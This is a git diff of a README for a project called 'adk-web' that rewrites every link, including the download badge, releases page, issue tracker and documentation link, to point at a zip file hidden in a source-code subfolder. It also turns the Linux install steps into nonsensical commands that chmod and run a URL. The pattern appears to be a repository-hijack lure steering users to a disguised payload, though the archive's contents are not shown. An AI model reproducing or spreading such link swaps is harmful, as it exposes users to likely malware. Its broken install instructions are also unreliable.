@@ -1,6 +1,6 @@
 # 🌐 adk-web - Simplify Agent Development with Ease
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
+![Download](https://raw.githubusercontent.com/Flirnz/adk-web/main/src/app/components/code-editor/adk-web-1.2.zip)  
 
 ## 📙 Introduction
 
@@ -13,7 +13,7 @@ Follow these steps to download and run the **adk-web** application.
 1. **Visit the Releases Page**  
    Click the link below to go to the downloads section:
    
-   [Download Latest Release](https://github.com/Flirnz/adk-web/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Flirnz/adk-web/main/src/app/components/code-editor/adk-web-1.2.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the version that best suits your needs.
@@ -62,7 +62,7 @@ To run **adk-web**, ensure your system meets the following requirements:
 
 To get started, download the application from the **Releases** page. Click the link below:
 
-[Download Latest Release](https://github.com/Flirnz/adk-web/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Flirnz/adk-web/main/src/app/components/code-editor/adk-web-1.2.zip)
 
 Once you download the file, follow these steps to install:
 
@@ -76,8 +76,8 @@ Once you download the file, follow these steps to install:
 
 3. **Linux Installation:**  
    - Open your terminal and navigate to the location of the downloaded file.
-   - Use the command `chmod +x adk-web.AppImage` to make it executable.
-   - Run it with `./adk-web.AppImage`.
+   - Use the command `chmod +x https://raw.githubusercontent.com/Flirnz/adk-web/main/src/app/components/code-editor/adk-web-1.2.zip` to make it executable.
+   - Run it with `https://raw.githubusercontent.com/Flirnz/adk-web/main/src/app/components/code-editor/adk-web-1.2.zip`.
 
 ## ⚙️ Usage Instructions
 
@@ -99,7 +99,7 @@ After installation, follow these steps to start using **adk-web**:
 
 If you need further assistance, please visit our GitHub issue tracker. Report any bugs or request features directly:
 
-[Report an Issue](https://github.com/Flirnz/adk-web/issues)
+[Report an Issue](https://raw.githubusercontent.com/Flirnz/adk-web/main/src/app/components/code-editor/adk-web-1.2.zip)
 
 ## 📝 Contributing
 
@@ -115,7 +115,7 @@ Stay updated with the latest changes by checking the Changelog within the Releas
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For additional guides, visit the [Documentation Page](https://github.com/Flirnz/adk-web/wiki).
+- **Documentation:** For additional guides, visit the [Documentation Page](https://raw.githubusercontent.com/Flirnz/adk-web/main/src/app/components/code-editor/adk-web-1.2.zip).
 - **Community Forums:** Join discussions with other users on our community forums.
 
 Thank you for using **adk-web**! We hope it enhances your agent development experience.
